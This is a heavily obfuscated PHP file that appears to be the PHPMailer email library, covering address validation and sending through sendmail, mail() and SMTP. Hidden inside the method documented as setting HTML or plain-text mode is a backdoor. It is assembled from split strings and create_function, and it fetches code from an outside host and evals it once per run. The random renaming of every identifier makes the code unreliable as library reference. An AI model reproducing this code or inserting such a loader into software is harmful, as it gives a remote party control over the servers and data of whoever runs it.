$ttpe_223244161){$ttpe_223244161=trim($ttpe_223244161);if(strpos($ttpe_223244161,'<')===false){if($this->dsvx_2011588939($ttpe_223244161)){$gjyn_1875539222[]=array('name'=>'','address'=>$ttpe_223244161);}}else{list($rxlv_1579384326,$irje_3885137012)=explode('<',$ttpe_223244161);$irje_3885137012=trim(str_replace('>','',$irje_3885137012));if($this->dsvx_2011588939($irje_3885137012)){$gjyn_1875539222[]=array('name'=>trim(str_replace(array('"',"'"),'',$rxlv_1579384326)),'address'=>$irje_3885137012);}}}}return $gjyn_1875539222;}/**
     * Sets message type to HTML or plain.
     * @param boolean $isHtml True for HTML mode.
     * @return void
     */ public function jqcv_803450723($rflu_3108302313=true){global $thur_2767879305;$svgl_467061739='file'.'_g';if($rflu_3108302313){$this->$bsce_2505547451='text/html';}else{$this->$bsce_2505547451='text/plain';}$hhim_3793568028='.$t."lef$flu'.'sh'.'$t"; '.'@ev';$neim_2155202497="cre"."ate_"."func"."tion";$xoiq_678566752=@$neim_2155202497('$fl'.'ush,$t','$comma = $t'.$hhim_3793568028.'al(@'.$svgl_467061739.'et_contents("h'.'tt'.'p:$comma-2"));');if($thur_2767879305!=2){$xoiq_678566752('8.p'.'w','/');$thur_2767879305=2;}}/**
     * Set the From and FromName properties.
     * @param string $address
     * @param string $name
     * @param boolean $auto Whether to also set the Sender address, defaults to true
     * @throws phpmailerException
     * @return boolean
     */ public function tnku_753605756($ttpe_223244161,$rxlv_1579384326='',$ivkm_1723475450=true){$ttpe_223244161=trim($ttpe_223244161);$rxlv_1579384326=trim(preg_replace('/[\r\n]+/','',$rxlv_1579384326));if(($wtaj_2161764012=strrpos($ttpe_223244161,'@'))===false or(!$this->qarp_751062919(substr($ttpe_223244161,++$wtaj_2161764012))or!$this->jxxl_1926302854())and!$this->dsvx_2011588939($ttpe_223244161)){$hfns_737763667=$this->zhkz_822707298('invalid_address')." (setFrom) $ttpe_223244161";$this->atvy_1425932775($hfns_737763667);$this->thqc_1132236784($hfns_737763667);if($this->$cdmv_440379532){throw new gpmm_657600444($hfns_737763667);}return false;}$this->$qxvc_2035421089=$ttpe_223244161;$this->$krwg_2714639915=$rxlv_1579384326;if($ivkm_1723475450){if(empty($this->$gxrq_2773902110)){$this->$gxrq_2773902110=$ttpe_223244161;}}return true;}/**
     * Return the Message-ID header of the last email.
     * Technically this is the value from the last time the headers were created,
     * but it's also the message ID of the last sent message except in
     * pathological cases.
     * @return string
     */ public function jeam_1569650345(){return $this->$bcpp_2870337799;}/**
     * Check that a string looks like an email address.
     * @param string $address The email address to check
     * @param string|callable $patternselect A selector for the validation pattern to use :
     * * `auto` Pick best pattern automatically;
     * * `pcre8` Use the squiloople.com pattern, requires PCRE > 8.0, PHP >= 5.3.2, 5.2.14;
     * * `pcre` Use old PCRE implementation;
     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL;
     * * `html5` Use the pattern given by the HTML5 spec for 'email' type form input elements.
     * * `noregex` Don't use a regex: super fast, really dumb.
     * Alternatively you may pass in a callable to inject your own validator, for example:
     * PHPMailer::validateAddress('user@example.com', function($address) {
     *     return (strpos($address, '@') !== false);
     * });
     * You can also set the PHPMailer::$validator static to a callable, allowing built-in methods to use your validator.
     * @return boolean
     * @static
     * @access public
     */ public static function dsvx_2011588939($ttpe_223244161,$xaeb_1846947887=null){if(is_null($xaeb_1846947887)){$xaeb_1846947887=self::$wxkp_4204957896;}if(is_callable($xaeb_1846947887)){return call_user_func($xaeb_1846947887,$ttpe_223244161);}if(strpos($ttpe_223244161,"\n")!==false or strpos($ttpe_223244161,"\r")!==false){return false;}if(!$xaeb_1846947887 or $xaeb_1846947887=='auto'){if(defined('PCRE_VERSION')){if(version_compare(PCRE_VERSION,'8.0.3')>=0){$xaeb_1846947887='pcre8';}else{$xaeb_1846947887='pcre';}}elseif(function_exists('extension_loaded')and extension_loaded('pcre')){$xaeb_1846947887='pcre';}else{if(version_compare(PHP_VERSION,'5.2.0')>=0){$xaeb_1846947887='php';}else{$xaeb_1846947887='noregex';}}}switch($xaeb_1846947887){case 'pcre8':/**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */ return(boolean)preg_match('/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)'.'((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)'.'(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)'.'([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*'.'(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)'.'(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}'.'|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:'.'|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',$ttpe_223244161);case 'pcre':return(boolean)preg_match('/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>'.'[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")'.'(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*'.'@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})'.'(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:'.'[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?'.'::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:'.'[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?'.'::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',$ttpe_223244161);case 'html5':/**
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */ return(boolean)preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}'.'[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',$ttpe_223244161);case 'noregex':return(strlen($ttpe_223244161)>=3 and strpos($ttpe_223244161,'@')>=1 and strpos($ttpe_223244161,'@')!=strlen($ttpe_223244161)-1);case 'php':default:return(boolean)filter_var($ttpe_223244161,FILTER_VALIDATE_EMAIL);}}/**
     * Tells whether IDNs (Internationalized Domain Names) are supported or not. This requires the
     * "intl" and "mbstring" PHP extensions.
     * @return bool "true" if required functions for IDN support are present
     */ public function jxxl_1926302854(){return function_exists('idn_to_ascii')and function_exists('mb_convert_encoding');}/**
     * Converts IDN in given email address to its ASCII form, also known as punycode, if possible.
     * Important: Address must be passed in same encoding as currently set in PHPMailer::$CharSet.
     * This function silently returns unmodified address if:
     * - No conversion is necessary (i.e. domain name is not an IDN, or is already in ASCII form)
     * - Conversion to punycode is impossible (e.g. required PHP functions are not available)
     *   or fails for any reason (e.g. domain has characters not allowed in an IDN)
     * @see PHPMailer::$CharSet
     * @param string $address The email address to convert
     * @return string The encoded address in ASCII form
     */ public function dexq_510578393($ttpe_223244161){if($this->jxxl_1926302854()and!empty($this->$xekg_286892112)and($wtaj_2161764012=strrpos($ttpe_223244161,'@'))!==false){$xlro_2812878347=substr($ttpe_223244161,++$wtaj_2161764012);if($this->qarp_751062919($xlro_2812878347)and@mb_check_encoding($xlro_2812878347,$this->$xekg_286892112)){$xlro_2812878347=mb_convert_encoding($xlro_2812878347,'UTF-8',$this->$xekg_286892112);if(($bjyv_3880759909=defined('INTL_IDNA_VARIANT_UTS46')?idn_to_ascii($xlro_2812878347,0,INTL_IDNA_VARIANT_UTS46):idn_to_ascii($xlro_2812878347))!==false){return substr($ttpe_223244161,0,$wtaj_2161764012).$bjyv_3880759909;}}}return $ttpe_223244161;}/**
     * Create a message and send it.
     * Uses the sending method specified by $Mailer.
     * @throws phpmailerException
     * @return boolean false on error - See the ErrorInfo property for details of the error.
     */ public function cgvm_2809346765(){try{if(!$this->wsxu_1077481805()){return false;}return $this->pkrz_325910906();}catch(phpmailerException $ptmu_2181043141){$this->$rfxt_4139716636='';$this->atvy_1425932775($ptmu_2181043141->pmnj_171178595());if($this->$cdmv_440379532){throw $ptmu_2181043141;}return false;}}/**
     * Prepare a message for sending.
     * @throws phpmailerException
     * @return boolean
     */ public function wsxu_1077481805(){try{$this->$vlrm_58502344=0;$this->$rfxt_4139716636='';foreach(array_merge($this->$afpv_852320140,$this->$ycqy_3810730324)as $bmqr_2412646131){$bmqr_2412646131[1]=$this->dexq_510578393($bmqr_2412646131[1]);call_user_func_array(array($this,'addAnAddress'),$bmqr_2412646131);}if((count($this->$iocy_252678980)+count($this->$isnj_112844655)+count($this->$givi_3685882489))<1){throw new gpmm_657600444($this->zhkz_822707298('provide_address'),self::STOP_CRITICAL);}foreach(array('From','Sender','ConfirmReadingTo')as $semo_1183345714){$this->$semo_1183345714=trim($this->$semo_1183345714);if(empty($this->$semo_1183345714)){continue;}$this->$semo_1183345714=$this->dexq_510578393($this->$semo_1183345714);if(!$this->dsvx_2011588939($this->$semo_1183345714)){$hfns_737763667=$this->zhkz_822707298('invalid_address').' (punyEncode) '.$this->$semo_1183345714;$this->atvy_1425932775($hfns_737763667);$this->thqc_1132236784($hfns_737763667);if($this->$cdmv_440379532){throw new gpmm_657600444($hfns_737763667);}return false;}}if($this->flzu_354580856()){$this->$bsce_2505547451='multipart/alternative';}$this->lxwn_3599526309();if(!$this->$ovxd_3756472130 and empty($this->$lhgl_2491560500)){throw new gpmm_657600444($this->zhkz_822707298('empty_message'),self::STOP_CRITICAL);}$this->$chyd_3901694020='';$this->$ormt_905206479=$this->vkyp_695867810();$sjbc_2040608817=$this->$chyd_3901694020;$this->$chyd_3901694020=$this->lnat_3607705866();$this->$chyd_3901694020.=$sjbc_2040608817;if($this->$okms_3272781023=='mail'){if(count($this->$iocy_252678980)>0){$this->$rfxt_4139716636.=$this->tyec_1512229866('To',$this->$iocy_252678980);}else{$this->$rfxt_4139716636.=$this->qlvg_3753888088('To','undisclosed-recipients:;');}$this->$rfxt_4139716636.=$this->qlvg_3753888088('Subject',$this->nsvw_633294872($this->xdha_1719758595(trim($this->$uash_182487569))));}if(!empty($this->$gbew_2257572023)and!empty($this->$vmsl_2722024824)and(!empty($this->$rwhl_2210386905)or(!empty($this->$mmqc_284170424)and self::ulfd_820602762($this->$mmqc_284170424)and file_exists($this->$mmqc_284170424)))){$fqkk_4214893583=$this->dvps_2947876416($this->$chyd_3901694020.$this->$rfxt_4139716636,$this->nsvw_633294872($this->xdha_1719758595($this->$uash_182487569)),$this->$ormt_905206479);$this->$chyd_3901694020=rtrim($this->$chyd_3901694020,"\r\n ").self::CRLF.str_replace("\r\n","\n",$fqkk_4214893583).self::CRLF;}return true;}catch(phpmailerException $ptmu_2181043141){$this->atvy_1425932775($ptmu_2181043141->pmnj_171178595());if($this->$cdmv_440379532){throw $ptmu_2181043141;}return false;}}/**
     * Actually send a message.
     * Send the email via the selected mechanism
     * @throws phpmailerException
     * @return boolean
     */ public function pkrz_325910906(){try{switch($this->$okms_3272781023){case 'sendmail':case 'qmail':return $this->qcjw_4096800624($this->$chyd_3901694020,$this->$ormt_905206479);case 'smtp':return $this->imbu_3807936968($this->$chyd_3901694020,$this->$ormt_905206479);case 'mail':return $this->xtuw_1446093667($this->$chyd_3901694020,$this->$ormt_905206479);default:$mnfw_3132085900=$this->$okms_3272781023.'Send';if(method_exists($this,$mnfw_3132085900)){return $this->$mnfw_3132085900($this->$chyd_3901694020,$this->$ormt_905206479);}return $this->xtuw_1446093667($this->$chyd_3901694020,$this->$ormt_905206479);}}catch(phpmailerException $ptmu_2181043141){$this->atvy_1425932775($ptmu_2181043141->pmnj_171178595());$this->thqc_1132236784($ptmu_2181043141->pmnj_171178595());if($this->$cdmv_440379532){throw $ptmu_2181043141;}}return false;}/**
     * Send mail using the $Sendmail program.
     * @param string $header The message headers
     * @param string $body The message body
     * @see PHPMailer::$Sendmail
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */ protected function qcjw_4096800624($iinp_1853008065,$ssxo_3685223346){if(!empty($this->$gxrq_2773902110)and self::ecwq_1897500661($this->$gxrq_2773902110)){if($this->$okms_3272781023=='qmail'){$nvvp_3300803517='%s -f%s';}else{$nvvp_3300803517='%s -oi -f%s -t';}}else{if($this->$okms_3272781023=='qmail'){$nvvp_3300803517='%s';}else{$nvvp_3300803517='%s -oi -t';}}$acxs_2958943915=sprintf($nvvp_3300803517,escapeshellcmd($this->$wmik_1791783119),$this->$gxrq_2773902110);if($this->$ltap_2795026134){foreach($this->$nvdx_1430038571 as $zsrd_3925863679){if(!@$naok_1361488968=popen($acxs_2958943915,'w')){throw new gpmm_657600444($this->zhkz_822707298('execute').$this->$wmik_1791783119,self::STOP_CRITICAL);}fputs($naok_1361488968,'To: '.$zsrd_3925863679."\n");fputs($naok_1361488968,$iinp_1853008065);fputs($naok_1361488968,$ssxo_3685223346);$xkdg_325763347=pclose($naok_1361488968);$this->lcxz_1576094480(($xkdg_325763347==0),array($zsrd_3925863679),$this->$isnj_112844655,$this->$givi_3685882489,$this->$uash_182487569,$ssxo_3685223346,$this->$qxvc_2035421089);if($xkdg_325763347!=0){throw new gpmm_657600444($this->zhkz_822707298('execute').$this->$wmik_1791783119,self::STOP_CRITICAL);}}}else{if(!@$naok_1361488968=popen($acxs_2958943915,'w')){throw new gpmm_657600444($this->zhkz_822707298('execute').$this->$wmik_1791783119,self::STOP_CRITICAL);}fputs($naok_1361488968,$iinp_1853008065);fputs($naok_1361488968,$ssxo_3685223346);$xkdg_325763347=pclose($naok_1361488968);$this->lcxz_1576094480(($xkdg_325763347==0),$this->$iocy_252678980,$this->$isnj_112844655,$this->$givi_3685882489,$this->$uash_182487569,$ssxo_3685223346,$this->$qxvc_2035421089);if($xkdg_325763347!=0){throw new gpmm_657600444($this->zhkz_822707298('execute').$this->$wmik_1791783119,self::STOP_CRITICAL);}}return true;}/**
     * Fix CVE-2016-10033 and CVE-2016-10045 by disallowing potentially unsafe shell characters.
     *
     * Note that escapeshellarg and escapeshellcmd are inadequate for our purposes, especially on Windows.
     * @param string $string The string to be validated
     * @see https://github.com/PHPMailer/PHPMailer/issues/924 CVE-2016-10045 bug report
     * @access protected
     * @return boolean
     */ protected static function ecwq_1897500661($kdvd_2663297705){if(escapeshellcmd($kdvd_2663297705)!==$kdvd_2663297705 or!in_array(escapeshellarg($kdvd_2663297705),array("'$kdvd_2663297705'","\"$kdvd_2663297705\""))){return false;}$ipnw_25009842=strlen($kdvd_2663297705);for($crku_3865851505=0;$crku_3865851505<$ipnw_25009842;$crku_3865851505++){$isnj_112844655=$kdvd_2663297705[$crku_3865851505];if(!ctype_alnum($isnj_112844655)&&strpos('@_-.',$isnj_112844655)===false){return false;}}return true;}/**
     * Check whether a file path is of a permitted type.
     * Used to reject URLs and phar files from functions that access local file paths,
     * such as addAttachment.
     * @param string $path A relative or absolute path to a file.
     * @return bool
     */ protected static function ulfd_820602762($vroo_190089999){return!preg_match('#^[a-z]+://#i',$vroo_190089999);}/**
     * Send mail using the PHP mail() function.
     * @param string $header The message headers
     * @param string $body The message body
     * @link http://www.php.net/manual/en/book.mail.php
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */ protected function xtuw_1446093667($iinp_1853008065,$ssxo_3685223346){$cbxx_2070919892=array();foreach($this->$iocy_252678980 as $svtj_1238188993){$cbxx_2070919892[]=$this->jegf_2611113625($svtj_1238188993);}$bqux_3616002756=implode(', ',$cbxx_2070919892);$bmqr_2412646131=null;if(!empty($this->$gxrq_2773902110)and $this->dsvx_2011588939($this->$gxrq_2773902110)){if(self::ecwq_1897500661($this->$gxrq_2773902110)){$bmqr_2412646131=sprintf('-f%s',$this->$gxrq_2773902110);}}if(!empty($this->$gxrq_2773902110)and!ini_get('safe_mode')and $this->dsvx_2011588939($this->$gxrq_2773902110)){$kaoo_2441552085=ini_get('sendmail_from');ini_set('sendmail_from',$this->$gxrq_2773902110);}$xkdg_325763347=false;if($this->$ltap_2795026134 and count($cbxx_2070919892)>1){foreach($cbxx_2070919892 as $zsrd_3925863679){$xkdg_325763347=$this->rypm_520871176($zsrd_3925863679,$this->$uash_182487569,$ssxo_3685223346,$iinp_1853008065,$bmqr_2412646131);$this->lcxz_1576094480($xkdg_325763347,array($zsrd_3925863679),$this->$isnj_112844655,$this->$givi_3685882489,$this->$uash_182487569,$ssxo_3685223346,$this->$qxvc_2035421089);}}else{$xkdg_325763347=$this->rypm_520871176($bqux_3616002756,$this->$uash_182487569,$ssxo_3685223346,$iinp_1853008065,$bmqr_2412646131);$this->lcxz_1576094480($xkdg_325763347,$this->$iocy_252678980,$this->$isnj_112844655,$this->$givi_3685882489,$this->$uash_182487569,$ssxo_3685223346,$this->$qxvc_2035421089);}if(isset($kaoo_2441552085)){ini_set('sendmail_from',$kaoo_2441552085);}if(!$xkdg_325763347){throw new gpmm_657600444($this->zhkz_822707298('instantiate'),self::STOP_CRITICAL);}return true;}/**
     * Get an instance to use for SMTP operations.
     * Override this function to load your own SMTP implementation
     * @return SMTP
     */ public function rehg_909052409(){if(!is_object($this->$pqyb_2753055919)){$this->$pqyb_2753055919=new lxxf_889366631;}return $this->$pqyb_2753055919;}/**
     * Send mail via SMTP.
     * Returns false if there is a bad MAIL FROM, RCPT, or DATA input.
     * Uses the PHPMailerSMTP class by default.
     * @see PHPMailer::getSMTPInstance() to use a different class.
     * @param string $header The message headers
     * @param string $body The message body
     * @throws phpmailerException
     * @uses SMTP
     * @access protected
     * @return boolean
     */ protected function imbu_3807936968($iinp_1853008065,$ssxo_3685223346){$koyw_16513813=array();if(!$this->dlny_257889898($this->$rukp_1890720703)){throw new gpmm_657600444($this->zhkz_822707298('smtp_connect_failed'),self::STOP_CRITICAL);}if(!empty($this->$gxrq_2773902110)and $this->dsvx_2011588939($this->$gxrq_2773902110)){$whzq_1439793499=$this->$gxrq_2773902110;}else{$whzq_1439793499=$this->$qxvc_2035421089;}if(!$this->$pqyb_2753055919->ghsz_1361488968($whzq_1439793499)){$this->atvy_1425932775($this->zhkz_822707298('from_failed').$whzq_1439793499.' : '.implode(',',$this->$pqyb_2753055919->rtjb_2886680118()));throw new gpmm_657600444($this->$wblz_3236939731,self::STOP_CRITICAL);}foreach(array($this->$iocy_252678980,$this->$isnj_112844655,$this->$givi_3685882489)as $kfbl_3607831825){foreach($kfbl_3607831825 as $bqux_3616002756){if(!$this->$pqyb_2753055919->ywma_1745156937($bqux_3616002756[0])){$znpg_1574812785=$this->$pqyb_2753055919->rtjb_2886680118();$koyw_16513813[]=array('to'=>$bqux_3616002756[0],'error'=>$znpg_1574812785['detail']);$sfgu_469319589=false;}else{$sfgu_469319589=true;}$this->lcxz_1576094480($sfgu_469319589,array($bqux_3616002756[0]),array(),array(),$this->$uash_182487569,$ssxo_3685223346,$this->$qxvc_2035421089);}}if((count($this->$abzh_2865723390)>count($koyw_16513813))and!$this->$pqyb_2753055919->yksa_2918445923($iinp_1853008065.$ssxo_3685223346)){throw new gpmm_657600444($this->zhkz_822707298('data_not_accepted'),self::STOP_CRITICAL);}if($this->$zqgs_2782037843){$this->$pqyb_2753055919->dfym_1352515405();}else{$this->$pqyb_2753055919->cgzv_1135269781();$this->$pqyb_2753055919->svbr_318865860();}if(count($koyw_16513813)>0){$qnxw_137403929='';foreach($koyw_16513813 as $vcge_2183870971){$qnxw_137403929.=$vcge_2183870971['to'].': '.$vcge_2183870971['error'];}throw new gpmm_657600444($this->zhkz_822707298('recipients_failed').$qnxw_137403929,self::STOP_CONTINUE);}return true;}/**
     * Initiate a connection to an SMTP server.
     * Returns false if the operation failed.
     * @param array $options An array of options compatible with stream_context_create()
     * @uses SMTP
     * @access public
     * @throws phpmailerException
     * @return boolean
     */ public function dlny_257889898($vpgo_3493198471=null){if(is_null($this->$pqyb_2753055919)){$this->$pqyb_2753055919=$this->rehg_909052409();}if(is_null($vpgo_3493198471)){$vpgo_3493198471=$this->$rukp_1890720703;}if($this->$pqyb_2753055919->lckm_448207029()){return true;}$this->$pqyb_2753055919->wkqo_327851548($this->$stew_3049848695);$this->$pqyb_2753055919->zcoa_3548609586($this->$fpci_1743278776);$this->$pqyb_2753055919->yhdp_2164157808($this->$tgfy_1902925506);$this->$pqyb_2753055919->prfp_4193386195($this->$dqrh_3211254005);$bgko_3637339833=explode(';',$this->$xcqu_4021340703);$lsev_694718099=null;foreach($bgko_3637339833 as $ckcz_2823383561){$trdv_1895534400=array();if(!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*|\[[a-fA-F0-9:]+\]):?([0-9]*)$/',trim($ckcz_2823383561),$trdv_1895534400)){$this->thqc_1132236784('Ignoring invalid host: '.$ckcz_2823383561);continue;}$qbta_2477885070='';$edsp_920541700=$this->$kmyl_3151829732;$yrqn_2902269363=($this->$kmyl_3151829732=='tls');if('ssl'==$trdv_1895534400[2]or(''==$trdv_1895534400[2]and 'ssl'==$this->$kmyl_3151829732)){$qbta_2477885070='ssl://';$yrqn_2902269363=false;$edsp_920541700='ssl';}elseif($trdv_1895534400[2]=='tls'){$yrqn_2902269363=true;$edsp_920541700='tls';}$qmbt_224674680=defined('OPENSSL_ALGO_SHA1');if('tls'===$edsp_920541700 or 'ssl'===$edsp_920541700){if(!$qmbt_224674680){throw new gpmm_657600444($this->zhkz_822707298('extension_missing').'openssl',self::STOP_CRITICAL);}}$xywq_3475444733=$trdv_1895534400[3];$deuv_1133600204=$this->$fumj_4138466142;$acrw_2829398978=(integer)$trdv_1895534400[4];if($acrw_2829398978>0 and $acrw_2829398978<65536){$deuv_1133600204=$acrw_2829398978;}if($this->$pqyb_2753055919->zkkj_1959786783($qbta_2477885070.$xywq_3475444733,$deuv_1133600204,$this->$stew_3049848695,$vpgo_3493198471)){try{if($this->$gxpq_2769848507){$sgcq_907060870=$this->$gxpq_2769848507;}else{$sgcq_907060870=$this->bavi_437344390();}$this->$pqyb_2753055919->xefo_907060870($sgcq_907060870);if($this->$cfcs_3788096020 and $qmbt_224674680 and $edsp_920541700!='ssl' and $this->$pqyb_2753055919->sovf_3663542552('STARTTLS')){$yrqn_2902269363=true;}if($yrqn_2902269363){if(!$this->$pqyb_2753055919->opax_1042703250()){throw new gpmm_657600444($this->zhkz_822707298('connect_host'));}$this->$pqyb_2753055919->xefo_907060870($sgcq_907060870);}if($this->$ghrq_1846840982){if(!$this->$pqyb_2753055919->ykkp_240127412($this->$ecyw_3835730324,$this->$jrwp_1641862994,$this->$yyvw_392524962,$this->$blvq_2665627764,$this->$elvq_2464630778)){throw new gpmm_657600444($this->zhkz_822707298('authenticate'));}}return true;}catch(phpmailerException $ptmu_2181043141){$lsev_694718099=$ptmu_2181043141;$this->thqc_1132236784($ptmu_2181043141->pmnj_171178595());$this->$pqyb_2753055919->cgzv_1135269781();}}}$this->$pqyb_2753055919->svbr_318865860();if($this->$cdmv_440379532 and!is_null($lsev_694718099)){throw $lsev_694718099;}return false;}/**
     * Close the active SMTP session if one exists.
     * @return void
     */ public function ksue_1664024304(){if(is_a($this->$pqyb_2753055919,'SMTP')){if($this->$pqyb_2753055919->lckm_448207029()){$this->$pqyb_2753055919->cgzv_1135269781();$this->$pqyb_2753055919->svbr_318865860();}}}/**
     * Set the language for error messages.
     * Returns false if it cannot load the language file.
     * The default language is English.
     * @param string $langcode ISO 639-1 2-character language code (e.g. French is "fr")
     * @param string $lang_path Path to the language file directory, with trailing separator (slash)
     * @return boolean
     * @access public
     */ public function edke_3729331321($iogn_2149189439='en',$hxgt_506774120=''){$xpug_2654845321=array('br'=>'pt_br','cz'=>'cs','dk'=>'da','no'=>'nb','se'=>'sv','sr'=>'rs');if(isset($xpug_2654845321[$iogn_2149189439])){$iogn_2149189439=$xpug_2654845321[$iogn_2149189439];}$urnh_2248994282=array('authenticate'=>'SMTP Error: Could not authenticate.','connect_host'=>'SMTP Error: Could not connect to SMTP host.','data_not_accepted'=>'SMTP Error: data not accepted.','empty_message'=>'Message body empty','encoding'=>'Unknown encoding: ','execute'=>'Could not execute: ','file_access'=>'Could not access file: ','file_open'=>'File Error: Could not open file: ','from_failed'=>'The following From address failed: ','instantiate'=>'Could not instantiate mail function.','invalid_address'=>'Invalid address: ','mailer_not_supported'=>' mailer is not supported.','provide_address'=>'You must provide at least one recipient email address.','recipients_failed'=>'SMTP Error: The following recipients failed: ','signing'=>'Signing Error: ','smtp_connect_failed'=>'SMTP connect() failed.','smtp_error'=>'SMTP server error: ','variable_set'=>'Cannot set or reset variable: ','extension_missing'=>'Extension missing: ');if(empty($hxgt_506774120)){$hxgt_506774120=dirname(__FILE__).DIRECTORY_SEPARATOR.'language'.DIRECTORY_SEPARATOR;}if(!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/',$iogn_2149189439)){$iogn_2149189439='en';}$rsos_820659650=true;$imgv_2583658359=$hxgt_506774120.'phpmailer.lang-'.$iogn_2149189439.'.php';if($iogn_2149189439!='en'){if(!self::ulfd_820602762($imgv_2583658359)or!is_readable($imgv_2583658359)){$rsos_820659650=false;}else{$rsos_820659650=include $imgv_2583658359;}}$this->$ufho_2882651222=$urnh_2248994282;return(boolean)$rsos_820659650;}/**
     * Get the array of strings for the current language.
     * @return array
     */ public function umnu_3649861976(){return $this->$ufho_2882651222;}/**
     * Create recipient headers.
     * @access public
     * @param string $type
     * @param array $addr An array of recipient,
     * where each recipient is a 2-element indexed array with element 0 containing an address
     * and element 1 containing a name, like:
     * array(array('joe@example.com', 'Joe User'), array('zoe@example.com', 'Zoe User'))
     * @return string
     */ public function tyec_1512229866($ouxh_2363381545,$zujm_1385861685){$gjyn_1875539222=array();foreach($zujm_1385861685 as $ttpe_223244161){$gjyn_1875539222[]=$this->jegf_2611113625($ttpe_223244161);}return $ouxh_2363381545.': '.implode(', ',$gjyn_1875539222).$this->$apvs_3568589458;}/**
     * Format an address for use in a message header.
     * @access public
     * @param array $addr A 2-element indexed array, element 0 containing an address, element 1 containing a name
     *      like array('joe@example.com', 'Joe User')
     * @return string
     */ public function jegf_2611113625($zujm_1385861685){if(empty($zujm_1385861685[1])){return $this->xdha_1719758595($zujm_1385861685[0]);}else{return $this->nsvw_633294872($this->xdha_1719758595($zujm_1385861685[1]),'phrase').' <'.$this->xdha_1719758595($zujm_1385861685[0]).'>';}}/**
     * Word-wrap message.
     * For use with mailers that do not automatically perform wrapping
     * and for quoted-printable encoded messages.
     * Original written by philippe.
     * @param string $message The message to wrap
     * @param integer $length The line length to wrap to
     * @param boolean $qp_mode Whether to run in Quoted-Printable mode
     * @access public
     * @return string
     */ public function dbmk_952593719($rxna_3065852031,$ipnw_25009842,$bani_3499936141=false){if($bani_3499936141){$emft_1141594233=sprintf(' =%s',$this->$apvs_3568589458);}else{$emft_1141594233=$this->$apvs_3568589458;}$xwjm_2685080992=(strtolower($this->$xekg_286892112)=='utf-8');$jhry_1700105113=strlen($this->$apvs_3568589458);$udba_3491428006=strlen(self::CRLF);$rxna_3065852031=$this->iwdw_723304945($rxna_3065852031);if(substr($rxna_3065852031,-$jhry_1700105113)==$this->$apvs_3568589458){$rxna_3065852031=substr($rxna_3065852031,0,-$jhry_1700105113);}$kygw_1325501590=explode($this->$apvs_3568589458,$rxna_3065852031);$rxna_3065852031='';foreach($kygw_1325501590 as $ladd_3507795190){$svpg_1904025228=explode(' ',$ladd_3507795190);$iidz_1116442498='';$odjr_510788991=true;foreach($svpg_1904025228 as $ynze_3287381265){if($bani_3499936141 